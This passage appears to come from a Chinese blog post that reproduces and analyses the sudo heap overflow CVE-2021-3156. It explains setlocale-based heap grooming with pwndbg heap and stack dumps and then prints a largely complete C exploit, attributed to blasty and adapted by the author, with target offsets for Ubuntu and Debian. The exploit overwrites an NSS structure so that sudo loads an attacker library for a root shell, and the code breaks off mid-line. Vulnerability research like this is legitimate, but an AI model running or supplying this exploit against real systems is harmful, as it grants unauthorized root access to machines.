<p>从上面的源码来看<code>setlocale</code>函数，如果传入的参数是<code>NULL</code>，那么就会返回<code>_nl_global_locale.__names</code>数组中对应的值即相应的<code>LC_*</code>的值。如果传入的参数是<code>“”</code>，那么就会根据环境变量设置<code>_nl_global_locale.__names</code>中的值，函数最主要的是进入了一个<code>while</code>循环，每次调用<code>_nl_find_locale</code>函数首先从环境变量中按照优先级顺序加载相应的环境变量，然后根据环境变量从<code>/usr/lib/locale</code>中查找有没有对应的文件，这里会根据<code>mask</code>的值控制加载的优先级，加载文件，如果没有对应的文件就会返回<code>NULL</code>。</p>
<blockquote>
<p>这里比如LC_COLLATE=C.UTF-8@aaaa，如果/usr/lib/locale/C.UTF-8@aaaa/LC_COLLATE文件存在的话，那么就加载这个文件，否则就加载/usr/lib/locale/C.UTF-8/LC_COLLATE文件，当然这里有很多的路径选择，不止这两个。</p>
</blockquote>
<p>当<code>_nl_find_locale</code>函数返回的为<code>NULL</code>的时候，<code>while</code>循环就会终止，此时<code>category&gt;0</code>，那么这里就表明加载环境变量出现了错误，会释放之前申请的所有的<code>newnames</code>，也就是环境变量中的值比如<code>C.UTF-8@aaaa</code>。</p>
<p>否则当<code>while</code>循环执行完毕之后就会将所有的<code>_nl_global_locale.__names</code>数组中对应的值设置为我们输入的值，然后将<code>LC_ALL</code>赋值</p>
<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2021-3156-sudo-heap-based-bufoverflow/2.png" alt="CVE-2021-3156%20sudo%20heap-based%20bufoverflow%20%E5%A4%8D%E7%8E%B0&amp;%E5%88%86%E6%9E%90%20f65c00b177cf4be1b02b394f2a54fb87/Untitled.png"></p>
<p>那么这里的<code>free</code>原语就出来了，假如我们想要设置<code>n</code>个<code>size</code>大小的堆块，那么就设置<code>n</code>个环境变量（这里注意顺序，环境变量从后向前开始加载），环境变量的值为<code>C.UTF-8@len</code>，其中<code>len</code>的大小满足<code>&gt; size-0x20 &amp; &lt; size-0x10</code>。</p>
<p>这里需要注意的一个问题就是，在进行环境变量加载的过程中会对于每一个不同<code>size</code>的堆块，都会释放一个<code>size+0x10</code>大小的堆块，这是路径拼接造成的。但是相同<code>size</code>大小的会复用同一个堆块，因此在<code>tcache</code>中不同<code>size</code>大小的堆块只会额外产生<code>1</code>个<code>size+0x10</code>大小的堆块。需要注意的是对于<code>size</code>比较小的堆块，由于<code>getlocale</code>中堆块的申请比较多，因此可能会被申请回去，目前可以肯定的是对于<code>0x80</code>或者大于<code>0x80</code>的附加堆块会保存在<code>tcache</code>中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555582580</span> (size : <span class="number">0x1da80</span>)</span><br><span class="line">       last_remainder: <span class="number">0x5555555814b0</span> (size : <span class="number">0xf90</span>)</span><br><span class="line">            unsortbin: <span class="number">0x5555555814b0</span> (size : <span class="number">0xf90</span>)</span><br><span class="line">(<span class="number">0x20</span>)   tcache_entry[<span class="number">0</span>](<span class="number">1</span>): <span class="number">0x5555555814a0</span></span><br><span class="line">(<span class="number">0x40</span>)   tcache_entry[<span class="number">2</span>](<span class="number">3</span>): <span class="number">0x55555557ff40</span> --&gt; <span class="number">0x555555580620</span> --&gt; <span class="number">0x555555581380</span><span class="comment">// group files</span></span><br><span class="line">(<span class="number">0x70</span>)   tcache_entry[<span class="number">5</span>](<span class="number">1</span>): <span class="number">0x555555580cb0</span> <span class="comment">// 环境变量释放产生的0x70堆块</span></span><br><span class="line">(<span class="number">0x80</span>)   tcache_entry[<span class="number">6</span>](<span class="number">1</span>): <span class="number">0x555555580a90</span> <span class="comment">// user_args堆块，是附加堆块</span></span><br><span class="line">(<span class="number">0x1e0</span>)   tcache_entry[<span class="number">28</span>](<span class="number">1</span>): <span class="number">0x55555557f2a0</span></span><br><span class="line">(<span class="number">0x410</span>)   tcache_entry[<span class="number">63</span>](<span class="number">1</span>): <span class="number">0x55555557f500</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里由于<code>ubuntu 20.04</code>下面我在调试的时候<code>execve</code>执行之后<code>sudo main</code>函数执行之前就会有一个<code>0x80</code>的堆块，不知道什么原因，因此这里直接释放<code>0x80</code>的堆块会有问题，因此这里我是用附加堆块来实现<code>0x80</code>大小的堆块的效果。</p>
<p>拿到上述的堆布局之后就可以将<code>user_args</code>长度设置为<code>0x80</code>，申请得到<code>0x555555580a90</code>堆块，之后就可以覆写<code>0x555555581380</code>的<code>group files service_user</code>结构体了。</p>
<blockquote>
<p>这里需要注意的是在溢出的时候不能溢出group files太多，会直接覆写到service_table也就是上面那个0x20大小的堆块，应该是在最后一次参数拷贝的时候恰好覆写到service_user结构体的name字段。不多覆写。</p>
</blockquote>
<p>这里我们看到堆块之间的差值是<code>0x8f0</code>，我们需要覆写这些长度。中间这些堆块都是在进行<code>setlocale</code>中产生的，对之后的程序进行没有影响，可以直接覆写。根据之前溢出的规则，遇到<code>\\\\</code>就会继续向后读。目前<code>exp</code>中参数设置如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;sudoedit&quot;</span>, <span class="string">&quot;-s&quot;</span>, smash_a, <span class="string">&quot;\\\\&quot;</span>, smash_b, NULL, envp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参数和环境变量在内存中的表现方式如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// argv-&gt;0x7ffc304d1a18</span><br><span class="line">pwndbg&gt; telescope 0x7ffc304d1a18</span><br><span class="line">00:0000│ rdx  0x7ffc304d1a18 —▸ 0x7ffc304d1df6 ◂— <span class="string">&#x27;sudoedit&#x27;</span></span><br><span class="line">01:0008│      0x7ffc304d1a20 —▸ 0x7ffc304d1dff ◂— 0x414141414100732d /* <span class="string">&#x27;-s&#x27;</span> */</span><br><span class="line">02:0010│      0x7ffc304d1a28 —▸ 0x7ffc304d1e02 ◂— <span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\\\&#x27;</span></span><br><span class="line">03:0018│      0x7ffc304d1a30 —▸ 0x7ffc304d1e3c ◂— 0x424242424242005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">04:0020│      0x7ffc304d1a38 —▸ 0x7ffc304d1e3e ◂— <span class="string">&#x27;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\\\\&#x27;</span></span><br><span class="line">05:0028│      0x7ffc304d1a40 ◂— 0x0</span><br><span class="line">06:0030│      0x7ffc304d1a48 —▸ 0x7ffc304d1e76 ◂— 0x5c005c005c005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">07:0038│      0x7ffc304d1a50 —▸ 0x7ffc304d1e78 ◂— 0x5c005c005c005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">//...</span><br><span class="line">pwndbg&gt;</span><br><span class="line">40:0200│   0x7ffc304d1c18 —▸ 0x7ffc304d1eea ◂— 0x5c005c005c005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">41:0208│   0x7ffc304d1c20 —▸ 0x7ffc304d1eec ◂— 0x5c005c005c005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">42:0210│   0x7ffc304d1c28 —▸ 0x7ffc304d1eee ◂— 0x2f58005c005c005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">43:0218│   0x7ffc304d1c30 —▸ 0x7ffc304d1ef0 ◂— 0x30502f58005c005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">44:0220│   0x7ffc304d1c38 —▸ 0x7ffc304d1ef2 ◂— 0x5f5030502f58005c /* <span class="string">&#x27;\\\\&#x27;</span> */</span><br><span class="line">45:0228│   0x7ffc304d1c40 —▸ 0x7ffc304d1ef4 ◂— <span class="string">&#x27;X/P0P_SH3LLZ_&#x27;</span></span><br><span class="line">46:0230│   0x7ffc304d1c48 —▸ 0x7ffc304d1f02 ◂— 0x433d4c4c415f434c (<span class="string">&#x27;LC_ALL=C&#x27;</span>)</span><br><span class="line">47:0238│   0x7ffc304d1c50 ◂— 0x0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>需要注意的是栈中每一个参数的结尾依靠的是<code>\\\\</code>。首先第一次复制，遇到<code>\\\\</code>会将<code>\\\\, smash_b, envp</code>拷贝一遍，然后是第二次复制，参数即为<code>\\\\</code>因此会将<code>smash_b,envp</code>拷贝一遍，接着是<code>smash_b</code>，由于<code>smash_b</code>之后也是<code>\\\\</code>，因此会一直继续拷贝，也就是将<code>envp</code>拷贝了一遍。借着就结束拷贝了。也就是说<code>smash_b,envp</code>都被拷贝了三遍，<code>smash_a</code>被拷贝了一遍。注意到每一次拷贝结束都会在结尾处加<code>space</code>即空格（最后一个空格会被覆写为<code>0</code>）。在设定<code>smash_a,smash_b,envp</code>的长度的时候基本就是<code>user_args/2</code>即为<code>smash_a,smash_b</code>的值，剩余的值<code>/3</code>就是<code>envp</code>的长度，不够的话再用<code>smash_a</code>的长度进行微调。</p>
<p>当我们覆写完毕<code>group service_user</code>结构体的<code>name</code>字段之后，<code>sudo</code>会经过一系列的调用直到<code>nss_load_library</code>最终打开<code>getshell</code>的动态链接库。</p>
<p>关于动态链接库编译有无空格的问题，如果是精准覆写<code>name</code>，那么就不需要空格，因为之后会被覆写为<code>0</code>，否则就需要空格。</p>
<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2021-3156-sudo-heap-based-bufoverflow/1.png" alt="CVE-2021-3156%20sudo%20heap-based%20bufoverflow%20%E5%A4%8D%E7%8E%B0&amp;%E5%88%86%E6%9E%90%20f65c00b177cf4be1b02b394f2a54fb87/Untitled%201.png"></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> ** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span></span><br><span class="line"><span class="comment"> ** ===========================================</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> ** Exploit for that sudo heap overflow thing everyone is talking about.</span></span><br><span class="line"><span class="comment"> ** This one aims for singleshot. Does not fuck with your system files.</span></span><br><span class="line"><span class="comment"> ** No warranties.</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> ** Shout outs to:</span></span><br><span class="line"><span class="comment"> **   Qualys      - for pumping out the awesome bugs</span></span><br><span class="line"><span class="comment"> **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)</span></span><br><span class="line"><span class="comment"> **   dsc         - for letting me rack up his electricity bill</span></span><br><span class="line"><span class="comment"> **   my wife     - for all the quality time we had to skip</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> **  Enjoy!</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> **   -- blasty // 20210130</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 512 environment variables should be enough for everyone</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ENVP 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> *target_name;</span><br><span class="line">        <span class="type">char</span> *sudoedit_path;</span><br><span class="line">        <span class="type">uint32_t</span> smash_len_a;</span><br><span class="line">        <span class="type">uint32_t</span> smash_len_b;</span><br><span class="line">        <span class="type">uint32_t</span> null_stomp_len;</span><br><span class="line">        <span class="type">uint32_t</span> lc_all_len;</span><br><span class="line">&#125; <span class="type">target_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *lc_names[]=&#123;</span><br><span class="line">        <span class="string">&quot;LC_COLLATE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_CTYPE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MONETARY&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_NUMERIC&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_TIME&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MESSAGES&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_PAPER&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_NAME&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_ADDRESS&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_TELEPHONE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MEASUREMENT&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_IDENTIFICATION&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">target_t</span> targets[] = &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Yes, same values as 20.04.1, but also confirmed.</span></span><br><span class="line">        .target_name    = <span class="string">&quot;Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">58</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">54</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">63</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">0x30</span></span><br><span class="line">        <span class="comment">// .lc_all_len     = 212</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        .target_name    = <span class="string">&quot;Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">58</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">54</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">63</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">212</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        .target_name    = <span class="string">&quot;Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">64</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">49</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">60</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">214</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">usage</span><span class="params">(<span class="type">char</span> *prog)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  usage: %s &lt;target&gt;\\n\\n&quot;</span>, prog);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  available targets:\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  ------------------------------------------------------------\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(targets) / <span class="keyword">sizeof</span>(<span class="type">target_t</span>); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    %d) %s\\n&quot;</span>, i, targets[i].target_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  ------------------------------------------------------------\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\\n** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;\\n\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        usage(argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> target_idx = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (target_idx &lt; <span class="number">0</span> || target_idx &gt;= (<span class="keyword">sizeof</span>(targets) / <span class="keyword">sizeof</span>(<span class="type">target_t</span>))) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;invalid target index\\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">target_t</span> *target = &amp;targets[ target_idx ];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;using target: &#x27;%s&#x27;\\n&quot;</span>, target-&gt;target_name);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *smash_a = <span class="built_in">calloc</span>(target-&gt;smash_len_a + <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *smash_b = <span class="built_in">calloc</span>(target-&gt;smash_len_b + <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(smash_a, <span class="string">&#x27;A&#x27;</span>, target-&gt;smash_len_a);</span><br><span class="line">    <span class="built_in">memset</span>(smash_b, <span class="string">&#x27;B&#x27;</span>, target-&gt;smash_len_b);</span><br><span class="line"></span><br><span class="line">    smash_a[target-&gt;smash_len_a] = <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line">    smash_b[target-&gt;smash_len_b] = <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *s_argv[]=&#123;</span><br><span class="line">        <span class="comment">// &quot;sudoedit&quot;, &quot;-s&quot;, smash_a, &quot;\\\\&quot;, NULL</span></span><br><span class="line">        <span class="comment">// &quot;sudoedit&quot;, &quot;-s&quot;, smash_a, NULL</span></span><br><span class="line">        <span class="string">&quot;sudoedit&quot;</span>, <span class="string">&quot;-s&quot;</span>, smash_a, <span class="string">&quot;\\\\&quot;</span>, smash_b, <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *s_envp[MAX_ENVP];</span><br><span class="line">    <span class="type">int</span> envp_pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">0x2b6</span>); i++) &#123;</span><br><span class="line">        s_envp[envp_pos++] = <span class="string">&quot;\\\\&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    s_envp[envp_pos++] = <span class="string">&quot;X/P0P_SH3LLZ_&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> lc_len = <span class="number">0x20</span>;</span><br><span class="line">    <span class="type">int</span> lc_num = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *temp=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">11</span>; i &gt; (<span class="number">11</span> - lc_num); i--)&#123;</span><br><span class="line">        temp = <span class="built_in">calloc</span>(lc_len + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">        <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=C.UTF-8@&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, lc_len);</span><br><span class="line">        s_envp[envp_pos++] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    temp = <span class="built_in">calloc</span>(<span class="number">0x50</span> + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=C.UTF-8@&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, <span class="number">0x50</span>);</span><br><span class="line">    s_envp[envp_pos++] = temp;</span><br><span class="line"></span><br><span class="line">    i -= <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// temp = calloc(0x60 + strlen(lc_names[i]) + 10, 1);</span></span><br><span class="line">    <span class="comment">// strcpy(temp, lc_names[i]);</span></span><br><span class="line">    <span class="comment">// strcpy(temp + strlen(lc_names[i]), &quot;=C.UTF-8@&quot;);</span></span><br><span class="line">    <span class="comment">// memset(temp+strlen(lc_names[i]) + 9, &#x27;A&#x27;+i, 0x60);</span></span><br><span class="line">    <span class="comment">// s_envp[envp_pos++] = temp;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// i -= 1;</span></span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">calloc</span>(lc_len + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=C.UTF-8@&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, lc_len);</span><br><span class="line">    s_envp[envp_pos++] = temp;</span><br><span class="line">    i-=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">calloc</span>(lc_len + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=XXXXXXXX&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span 